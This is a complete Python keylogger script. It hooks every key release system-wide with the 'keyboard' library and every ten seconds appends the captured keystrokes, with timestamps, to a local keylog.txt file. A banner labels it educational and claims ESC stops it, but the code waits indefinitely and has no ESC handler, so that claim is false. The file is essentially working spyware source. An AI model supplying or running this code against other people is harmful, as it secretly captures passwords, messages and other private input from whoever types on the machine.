import keyboard
import datetime
from threading import Timer

class Keylogger:
    def __init__(self, interval=60, log_file="keylog.txt"):
        self.interval = interval  # Time between reports
        self.log_file = log_file  # Output file
        self.log = ""
        self.start_dt = datetime.datetime.now()
        self.end_dt = datetime.datetime.now()

    def callback(self, event):
        """Called whenever a key is pressed"""
        name = event.name
        if len(name) > 1:  # Not a character key
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        
        self.log += name

    def report_to_file(self):
        """Saves keystrokes to file"""
        with open(self.log_file, "a") as f:
            f.write(f"{self.start_dt} - {self.end_dt}:\n")
            f.write(f"{self.log}\n\n")
        self.log = ""
        
    def report(self):
        """Called on timer interval"""
        if self.log:
            self.end_dt = datetime.datetime.now()
            self.report_to_file()
            self.start_dt = datetime.datetime.now()
        
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ == "__main__":
    print("""
    =============================================
    WARNING: KEYLOGGER - EDUCATIONAL PURPOSES ONLY
    =============================================
    This program will record all keystrokes and save them to 'keylog.txt'
    Press ESC to stop the keylogger.
    """)
    
    keylogger = Keylogger(interval=10)  # Report every 10 seconds
    keylogger.start()
